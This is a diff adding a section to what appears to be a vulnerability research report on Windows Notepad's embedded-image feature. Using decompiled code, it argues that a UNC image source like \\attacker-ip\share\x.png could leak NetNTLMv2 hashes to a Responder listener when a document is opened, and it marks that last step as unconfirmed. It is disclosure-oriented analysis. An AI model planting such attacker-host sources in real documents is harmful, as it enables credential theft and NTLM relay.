@@ -28,6 +28,14 @@ analysis cannot pin down is whether the HTTP request fires at load time or is
 deferred to the first render of the image; both are non-interactive, and only a
 dynamic test can establish the exact instant.
 
+The same lack of source validation opens a second, potentially higher-impact
+avenue: a UNC path (`\\host\share\x.png`) placed in the document is classified as
+a local file, has its `\\` prefix normalized rather than rejected, and is handed
+to a read-open — which on Windows would trigger SMB authentication and leak a
+NetNTLMv2 hash to an attacker-controlled host. That vector's final link sits in a
+component that could not be located and read, so it is a motivated hypothesis
+rather than a fully traced chain; it is described in its own section below.
+
 ## Scope and environment
 
 The target is `OleControls.dll` from the `Microsoft.WindowsNotepad` package,
@@ -275,6 +283,72 @@ Combined with the `OleControls.dll` chain, where a URL of type 1 leads to an HTT
 fetch with no application-level check, the entire setup of the remote request is
 automatic on open.
 
+## A second vector: UNC paths and NTLM credential leak
+
+The same root cause — no validation of the image source before it is acted on —
+opens a second, potentially higher-impact avenue. Everything above concerns the
+`http`/`https` (type 1) path. But the classifier `FUN_180001620` has a `file`
+branch and a fallback, and following those leads to local file access that does
+not appear to reject remote UNC paths.
+
+Recall how the classifier maps a source. It builds a URI with `CreateUri`, reads
+the scheme, and returns a small integer. The subtle detail is the `file` branch:
+it does `iVar1 = FUN_180013750(scheme, L"file", 4); uVar3 = iVar1 != 0;` — and
+since `FUN_180013750` returns 0 on a match, the scheme `file` yields type **0**.
+Just as important, a raw UNC path such as `\\host\share\x.png` is not a
+scheme-bearing URI at all, so `CreateUri` produces no scheme and the function hits
+its `return 0` fallback. Both a `file://host/share` URL and a bare `\\host\share`
+path therefore converge on type **0**.
+
+Type 0 is the `else` branch of the source switch in `FUN_18001c540`'s case 4 —
+the local-file branch. And that branch does not reject UNC paths; it actively
+**normalizes** them. The path-handling code there explicitly walks leading `\`
+and `/` characters:
+
+```c
+do {
+    if (((short)*puVar18 != 0x5c) && ((short)*puVar18 != 0x2f)) break;
+    puVar18 = (uint *)((longlong)puVar18 + 2);   // skip leading \ or / (UNC prefix)
+} while (puVar18 != puVar17);
+```
+
+After normalizing the path, it is handed to a method at vtable offset `+0x18` of
+an object created earlier with `CoCreateInstance` (CLSID
+`317D06E8-245F-433D-BDF7-79CE68D8ABC2`, interface IID
+`EC5EC8A9-C395-4314-9C77-54D7A935FF70`), called with `GENERIC_READ` (`0x80000000`):
+
+```c
+pcVar8 = *(code **)(**(longlong **)(param_1 + 0x2e) + 0x18);   // open method
+iVar12 = (*pcVar8)(*(undefined8 *)(param_1 + 0x2e), path, 0, 0x80000000);
+```
+
+The purpose of that call is to read the image bytes from the given path. On
+Windows, opening `\\host\share\file` for reading — with any file API, because the
+SMB redirector operates below them all — triggers an SMB connection and automatic
+NTLM authentication. If an attacker sets the image source to
+`\\attacker-ip\share\x.png` and has a listener such as Responder on the same
+network segment, the victim's machine would authenticate to the attacker's share,
+leaking a NetNTLMv2 hash usable for offline cracking or relay. Unlike the HTTP
+case, this NTLM leak is a native Windows behaviour, not gated by security zones,
+so it does not carry the HTTP path's "intranet-only auto-auth" limitation.
+
+**What is proven here, and what is not.** Statically it is established that (a) a
+UNC source reaches the local-file branch, (b) that branch normalizes rather than
+rejects the `\\` prefix, and (c) the normalized path is passed to a read-open with
+`GENERIC_READ`. The missing link is the object behind CLSID `317D06E8`: its
+`+0x18` open method is where a defensive UNC-reject check could still live, and
+that object is **not implemented in `OleControls.dll`** (its IID appears only once,
+as the interface requested at `1800461b8`, with no implementing vtable in this
+binary). It is not registered in the accessible packaged registry, and its GUID
+does not appear as a string in any package DLL, so the component could not be
+located and read. Nothing in the controllable code suggests a UNC filter — quite
+the opposite, since the upstream branch deliberately accepts and normalizes UNC —
+but the final open component could not be inspected. This vector is therefore a
+**motivated hypothesis with its last link open**, a notch below the HTTP vector,
+whose chain is fully visible inside `OleControls.dll`. Confirmation would come
+trivially from a network capture (a SYN to port 445 on an attacker-controlled host
+on document open), which is not currently possible because the feature is inert.
+
 ## What is not established
 
 Three things remain genuinely open, and it is important to be precise about them.
@@ -307,6 +381,14 @@ would additionally deliver attacker-controlled bytes to the GDI+ decoder. This i
 the same class of risk that commentators raised publicly when the feature was
 announced, and it rhymes with the earlier Markdown-link issue (CVE-2026-20841),
 which Microsoft hardened by adding URI checks and user prompts.
+
+The UNC/SMB variant, if its final link holds, would be materially worse than the
+HTTP one. Rather than leaking an IP and an open-confirmation, it would leak a
+NetNTLMv2 hash — an authentication credential — simply on opening a document,
+enabling offline cracking or NTLM relay and, in a domain environment, a foothold
+for lateral movement. That moves the ceiling from privacy/tracking to credential
+theft. It is the reason the UNC branch is worth flagging even though its last step
+is unconfirmed.
 
 ## Responsible next steps
 
@@ -346,7 +428,10 @@ The following table collects the functions referenced above for quick lookup.
 | `FUN_1401517e0` | Notepad.exe | Parse metadata (varint + UTF-16 strings; URL) |
 | `FUN_140128b20` | Notepad.exe (OleUtils) | Reads `ImgMetadataStream` (OpenStream then Read) |
 | ImageBlock CLSID | Notepad.exe | `95b90fa7-3125-40d3-b9ff-1e807810a5f7` |
-| `+0xbc` | object field | Source-type discriminant (1 means remote URL) |
+| `+0xbc` | object field | Source-type discriminant (1 = remote URL, 0 = file/UNC) |
+| File-open method | OleControls case 4 | vtable `+0x18` on CLSID `317D06E8`, `GENERIC_READ` |
+| Open component CLSID | external (not found) | `317D06E8-245F-433D-BDF7-79CE68D8ABC2` |
+| Open component IID | `1800461b8` | `EC5EC8A9-C395-4314-9C77-54D7A935FF70` |
 | User-Agent | OleControls case 4 | `Notepad (Windows NT 10.0)` |
 | `IViewObject` IID | `180046e50` | `0000010D-...-46` (rendering) |
 | `IOleObject` IID | `180046e60` | `00000112-...-46` (embedding) |
